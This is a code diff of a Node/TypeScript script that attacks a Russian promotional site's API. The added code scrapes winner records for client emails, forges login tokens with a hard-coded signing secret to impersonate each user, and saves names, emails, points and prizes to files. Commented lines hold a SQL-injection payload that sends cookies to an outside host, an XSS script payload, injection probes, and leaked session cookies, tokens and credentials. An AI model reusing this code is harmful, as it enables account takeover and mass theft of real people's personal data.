@@ -3,6 +3,7 @@ import {emails} from "./utils";
 const jwt = require('jsonwebtoken');
 import * as FS from 'fs';
 import * as path from "path";
+import {CustomRequest} from "./utils/request";
 
 // import * as opt from 'optimist';
 // import {CheckCookie} from "./check-cookie";
@@ -60,14 +61,17 @@ function randomBetween(start, end) {
 }
 
 (async () => {
-  // const res = await fetch("https://adm.dirolpromo.ru/api/winners?count=3000", {"credentials":"omit","headers":{"accept":"application/json, text/plain, */*","accept-language":"uk,ru;q=0.9,en;q=0.8","cache-control":"no-cache","pragma":"no-cache"},"referrer":"https://dirolpromo.ru/winners","referrerPolicy":"no-referrer-when-downgrade","body":null,"method":"GET","mode":"cors"});
-  // const body =  JSON.stringify({ email: "%2D%31%2B%75%6E%69%6F%6E%2B%73%65%6C%65%63%74%2B%31%2C0x3C7363726970743E696D673D6E657720496D61676528293B696D672E7372633D22687474703A2F2F6F6C642E616E7469636861742E72752F6367692D62696E2F732E6A70673F222B646F63756D656E742E636F6F6B69653B3C2F7363726970743E%2С%33%2F%2A" });
-  const body =  JSON.stringify({
+  const values = {};
+  const request = new CustomRequest({}, true);
+  // const res = await request.get("https://adm.dirolpromo.ru/api/winners?query=&date=2019-05-31&page=1&count=1000").catch(value => <any>console.log(value));
+  const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100000").catch(value => <any>console.log(value));
+  // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100&page=4").catch(value => <any>console.log(value));
+  const data = res.data;
 
-    // message: "; query",
-    // name: "ads",
-    // surname: "fad"
-  });
+  for (let value of data) {
+    if (!value.client) { continue; }
+    values[value.client.email] = value.client;
+  }
 
   // for (let i = 1000; i < 10000; ++i) {
   //   let token = Buffer.from('sergeicykalo@yanex.ru:123\'').toString('base64');
@@ -87,7 +91,12 @@ function randomBetween(start, end) {
   //
   //   await sleep(1000);
   // }
-  await main(876, 'sveta-s2302@yandex.ru');
+  const keys = Object.keys(values);
+  for (let i = 0; i < keys.length; ++i) {
+    const a = await main(request, keys[i]);
+    if (a) { i--; }
+  }
+  // await main('tataflower@list.ru');
 
 
   // const a = await fetch("https://adm.dirolpromo.ru/api/auth", {"credentials":"include","headers":{"accept":"application/json, text/plain, */*","accept-language":"uk,ru;q=0.9,en;q=0.8","authorization":"dmFsaW1wZXRyb3YxOTkzQGdtYWlsLmNvbTo2MTIx","cache-control":"no-cache","content-type":"application/json;charset=UTF-8","pragma":"no-cache"},"referrer":"https://dirolpromo.ru/","referrerPolicy":"no-referrer-when-downgrade","body":"{}","method":"POST","mode":"cors"});
@@ -152,53 +161,71 @@ function randomBetween(start, end) {
 
 
 
-async function main(user_id, email) {
-  console.log('main');
-  const secretKey = '}aTkB`4|xIR~k?1E6M<\'Yf?`BL+\'T5';
-  const token = jwt.sign({ "iss": "Raiffeisen",  email, user_id, "iat": 1544926208, "exp": 1555012608 }, secretKey);
-  const refreshToken = jwt.sign({ "iss": "Raiffeisen",  user_id, "iat": 1544926208, "exp": 1555012608 }, secretKey);
+async function main(request: CustomRequest, email) {
+  const secretKey = '[N%"D9&RJ{_A3EkK5`7dkh+%:';
+  const now = Date.now() / 1000 - 400;
 
-
-  const cookieToken = `{%22accessToken%22:%22${token}%22%2C%22refreshToken%22:%22${refreshToken}%22%2C%22expires_in%22:1555012608}`;
-  console.log(cookieToken);
-  return;
+  const token = jwt.sign({ "iss": "Raiffeisen", email, user_id: 0, "iat": now, "exp": now + 900 }, secretKey);
+  // const refreshToken = jwt.sign({ "iss": "Raiffeisen",  user_id: 0, "iat": now, "exp": now + 900 }, secretKey);
+  //
+  //
+  //
+  // const cookieToken = `{%22accessToken%22:%22${token}%22%2C%22refreshToken%22:%22${refreshToken}%22%2C%22expires_in%22:1555012608}`;
+  // console.log(cookieToken);
+  // return;
+  // console.log(cookieToken);
+  // return;
   //<script type="text/javascript" src="scripts.c4e6a0cd08523fd1390d.js"></script>
   // let res = await fetch(" https://adm.dirolpromo.ru/api/client", { headers: { 'Authorization': token } });
 
-  console.log('123');
+  try {
+// console.log('123');
   // let body = JSON.stringify({ client: { approve: true, email: "valimpet.rov1993@gmail.com", name: "'%`$%^&*'", phone_number: '<script type="text/javascript" src="https://docs.nestjs.com/scripts.c4e6a0cd08523fd1390d.js"></script>', surname: "'%`$%^&*'" } });
-  // let res = await fetch(" https://adm.dirolpromo.ru/api/client", { method: 'POST', body });
+  let res = await request.get("https://adm.dirolpromo.ru/api/client", { headers: { 'Authorization': token } });
   // let res = await fetch(" https://adm.dirolpromo.ru/api/client/prize", { headers: { 'Authorization': token }, method: 'POST', body: JSON.stringify({ prize_id: " fasdf" }) });
-  let res = await fetch(" https://adm.dirolpromo.ru/api/remember-password", { method: 'POST', body: JSON.stringify({ email: "%';``&^_" }) });
-  return console.log((await res.json()));
+  // let res = await fetch(" https://adm.dirolpromo.ru/api/remember-password", { method: 'POST', body: JSON.stringify({ email: "%';``&^_" }) });
 
-  // let cookie = "_ym_uid=1554919771262155861; _ym_d=1554919771; _ga=GA1.2.1581773223.1554919771; _gid=GA1.2.56025350.1554919771; _ym_isad=2; token={%22accessToken%22:%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwiZW1haWwiOiJ2LnN1c2hrb3YzNUBtYWlsLnJ1IiwidXNlcl9pZCI6ODc2LCJpYXQiOjE1NTQ5MTk5MDgsImV4cCI6MTU1NTAwNjMwOH0.CsYJm0MG87ZDyBvfWYc9ag_EymF2YseDlU4y51WvZEQ%22%2C%22refreshToken%22:%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwidXNlcl9pZCI6ODc2LCJpYXQiOjE1NTQ5MTk5MDgsImV4cCI6MTU1NzUxMTkwOH0.d8EKxtZg3aeRUlpMhnv63YiYdCLp4cMQsEZepxysBks%22%2C%22expires_in%22:1555006308}";
-  // let cookie = "_ym_uid=1554919771262155861; _ym_d=1554919771; _ga=GA1.2.1581773223.1554919771; _gid=GA1.2.56025350.1554919771; _ym_isad=2; token=" + cookieToken;
-  // let res = await fetch("https://dirolpromo.ru/personal", { headers: { cookie } });
-  let r = await fetch("https://dirolbot.special.ktsstudio.com/api/events", { headers: { 'Authorization': token } });
-  return console.log(await r.text());
+    const json = res.data;
+    // console.log('3', json)
+    if (!json.client) { return true }
+    fetch("https://adm.dirolpromo.ru/api/client/prizes", { headers: { 'Authorization': token } }).then(text => text.json())
+      .then(value => FS.appendFileSync('cookie/resultPrizes2.txt', `${json.client.email}. Prizes: ${JSON.stringify(value)}` + '\n'));
 
-  let cookie = 'token={%22accessToken%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwiZW1haWwiOiJzZXJnZWljeWthbG9AeWFuZGV4LnJ1IiwidXNlcl9pZCI6MSwiaWF0IjoxNTQ0OTI2MjA4LCJleHAiOjE1NTUwMTI2MDh9.CaTw-J0Xo-ac1hwkvT0U0JP4jVfgoAt4pim_en9bYkg%22%2C%22refreshToken%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwidXNlcl9pZCI6MSwiaWF0IjoxNTQ0OTI2MjA4LCJleHAiOjE1NTUwMTI2MDh9.DyFEe9EE-s5B5Qmz7D3u7wBIA1S8rN-gPGcJIOBipco%22%2C%22expires_in%22:1555012608}; _ga=GA1.2.295440183.1554986192; _gid=GA1.2.2053055001.1554986192; _ym_uid=1554986192140444230; _ym_d=1554986192; _ym_isad=1; _ym_visorc_52806562=w; XSRF-TOKEN=eyJpdiI6IlUxQm1ydGZFb0hWck1XbFNZNGtNblE9PSIsInZhbHVlIjoiU1wvTE8zdnlcL3JLN2RhYUorV1NwMzBrS2hyb0VcL0szcW11dUF4dFZIb3FYXC9zKzIxVmNmVW9JM1p6bGRCY1lwUU4iLCJtYWMiOiI1YjY2YzY3MTI2YmZiNjNkMzgxM2IyNzUyNzczNzgyY2E3OTc2OWViNWFhOWE4MjA3OTcyMTVlMzU1N2Y0ZmY1In0%3D; dirolpromo_session=eyJpdiI6InBPRWpoR0Y0XC81K0ZMK3ZPdHE0OU9nPT0iLCJ2YWx1ZSI6IlVKZjNNeFZ0K0UyVTRuTDl5VTBcL2Zkb1BLWitwUzYrUWM3Rm04c1pyN295aTZmbHdRejdjZTFUUHVQY0U2RXF2IiwibWFjIjoiYzkyZmRmZTM2MDQ5YmZkMDgzZTVmYTZiZDZhNjIzMDcxNmUzODdhOGNjNWU4NGMwN2Y3MGZiZTViYTQ4YWNkOSJ9';
-  let loginBody = JSON.stringify({ _token: 'CVNaMCZkZOsmPzwtlHZpPgv3gJ3Jbv4xa5Bxwcny', email: 'sergeicykalo@yandex.ru', password: 'dirol' });
-
-  let url = new URLSearchParams();
-  url.append("_token", "CVNaMCZkZOsmPzwtlHZpPgv3gJ3Jbv4xa5Bxwcny");
-  url.append("email", "sergeicykalo@yandex.ru");
-  url.append("password", "YtlTVajBRu07sIvQmv2bPNj/FHeEpvkgF5KO4GHgRFM=");
-
-  let res3 = await fetch("https://adm.dirolpromo.ru/login", { headers: { 'Authorization': token, cookie }, method: 'POST', body: url });
-  // const clientInfo = await res.json();
-  // console.log((await res3.text()).indexOf("Войти в режим администрирования"));
-  console.log((await res3.text()).indexOf("Неверный логин или пароль"));
-  process.exit();
-  return;
-  // FS.appendFileSync('cookie/access.txt', JSON.stringify(clientInfo) + '\n');
-
-  let res2 = await fetch(" https://adm.dirolpromo.ru/api/client/promocode", { headers: { 'Authorization': token } });
-  const promocodes = (await res2.json()).map(promo => promo.code);
-  for (let i = 0; i < promocodes.length; ++i) {
-    FS.appendFileSync('cookie/error.txt', promocodes[i] + '\n');
+    console.log(`${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}`);
+    FS.appendFileSync('cookie/result22.txt', `${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}` + '\n');
+  } catch (e) {
+    console.log(e)
   }
+
+  return;
+  //
+  // // let cookie = "_ym_uid=1554919771262155861; _ym_d=1554919771; _ga=GA1.2.1581773223.1554919771; _gid=GA1.2.56025350.1554919771; _ym_isad=2; token={%22accessToken%22:%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwiZW1haWwiOiJ2LnN1c2hrb3YzNUBtYWlsLnJ1IiwidXNlcl9pZCI6ODc2LCJpYXQiOjE1NTQ5MTk5MDgsImV4cCI6MTU1NTAwNjMwOH0.CsYJm0MG87ZDyBvfWYc9ag_EymF2YseDlU4y51WvZEQ%22%2C%22refreshToken%22:%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwidXNlcl9pZCI6ODc2LCJpYXQiOjE1NTQ5MTk5MDgsImV4cCI6MTU1NzUxMTkwOH0.d8EKxtZg3aeRUlpMhnv63YiYdCLp4cMQsEZepxysBks%22%2C%22expires_in%22:1555006308}";
+  // // let cookie = "_ym_uid=1554919771262155861; _ym_d=1554919771; _ga=GA1.2.1581773223.1554919771; _gid=GA1.2.56025350.1554919771; _ym_isad=2; token=" + cookieToken;
+  // // let res = await fetch("https://dirolpromo.ru/personal", { headers: { cookie } });
+  // let r = await fetch("https://dirolbot.special.ktsstudio.com/api/events", { headers: { 'Authorization': token } });
+  // return console.log(await r.text());
+  //
+  // let cookie = 'token={%22accessToken%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwiZW1haWwiOiJzZXJnZWljeWthbG9AeWFuZGV4LnJ1IiwidXNlcl9pZCI6MSwiaWF0IjoxNTQ0OTI2MjA4LCJleHAiOjE1NTUwMTI2MDh9.CaTw-J0Xo-ac1hwkvT0U0JP4jVfgoAt4pim_en9bYkg%22%2C%22refreshToken%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwidXNlcl9pZCI6MSwiaWF0IjoxNTQ0OTI2MjA4LCJleHAiOjE1NTUwMTI2MDh9.DyFEe9EE-s5B5Qmz7D3u7wBIA1S8rN-gPGcJIOBipco%22%2C%22expires_in%22:1555012608}; _ga=GA1.2.295440183.1554986192; _gid=GA1.2.2053055001.1554986192; _ym_uid=1554986192140444230; _ym_d=1554986192; _ym_isad=1; _ym_visorc_52806562=w; XSRF-TOKEN=eyJpdiI6IlUxQm1ydGZFb0hWck1XbFNZNGtNblE9PSIsInZhbHVlIjoiU1wvTE8zdnlcL3JLN2RhYUorV1NwMzBrS2hyb0VcL0szcW11dUF4dFZIb3FYXC9zKzIxVmNmVW9JM1p6bGRCY1lwUU4iLCJtYWMiOiI1YjY2YzY3MTI2YmZiNjNkMzgxM2IyNzUyNzczNzgyY2E3OTc2OWViNWFhOWE4MjA3OTcyMTVlMzU1N2Y0ZmY1In0%3D; dirolpromo_session=eyJpdiI6InBPRWpoR0Y0XC81K0ZMK3ZPdHE0OU9nPT0iLCJ2YWx1ZSI6IlVKZjNNeFZ0K0UyVTRuTDl5VTBcL2Zkb1BLWitwUzYrUWM3Rm04c1pyN295aTZmbHdRejdjZTFUUHVQY0U2RXF2IiwibWFjIjoiYzkyZmRmZTM2MDQ5YmZkMDgzZTVmYTZiZDZhNjIzMDcxNmUzODdhOGNjNWU4NGMwN2Y3MGZiZTViYTQ4YWNkOSJ9';
+  // let loginBody = JSON.stringify({ _token: 'CVNaMCZkZOsmPzwtlHZpPgv3gJ3Jbv4xa5Bxwcny', email: 'sergeicykalo@yandex.ru', password: 'dirol' });
+  //
+  // let url = new URLSearchParams();
+  // url.append("_token", "CVNaMCZkZOsmPzwtlHZpPgv3gJ3Jbv4xa5Bxwcny");
+  // url.append("email", "sergeicykalo@yandex.ru");
+  // url.append("password", "YtlTVajBRu07sIvQmv2bPNj/FHeEpvkgF5KO4GHgRFM=");
+  //
+  // let res3 = await fetch("https://adm.dirolpromo.ru/login", { headers: { 'Authorization': token, cookie }, method: 'POST', body: url });
+  // // const clientInfo = await res.json();
+  // // console.log((await res3.text()).indexOf("Войти в режим администрирования"));
+  // console.log((await res3.text()).indexOf("Неверный логин или пароль"));
+  // process.exit();
+  // return;
+  // // FS.appendFileSync('cookie/access.txt', JSON.stringify(clientInfo) + '\n');
+  //
+  // let res2 = await fetch(" https://adm.dirolpromo.ru/api/client/promocode", { headers: { 'Authorization': token } });
+  // const promocodes = (await res2.json()).map(promo => promo.code);
+  // for (let i = 0; i < promocodes.length; ++i) {
+  //   FS.appendFileSync('cookie/error.txt', promocodes[i] + '\n');
+  // }
 
 }
 
